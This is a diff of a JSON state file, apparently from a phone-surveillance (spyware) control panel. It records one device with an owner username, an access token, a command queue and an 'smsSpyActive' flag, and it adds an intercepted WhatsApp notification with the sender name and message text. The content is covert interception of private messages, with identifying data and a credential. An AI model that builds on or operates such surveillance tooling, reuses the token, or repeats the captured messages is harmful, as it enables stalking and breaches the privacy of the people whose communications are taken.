@@ -9345,7 +9345,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777249541146,
+    "lastSeen": 1777249571172,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -9361,6 +9361,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎BUNDA REMPONG (3 pesan): ~ Nasi Goreng Bang Husaein",
+        "content": "Biarmi, asl yg lain siap gaskanmi sj",
+        "time": "27/04 08:26",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777249572741
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
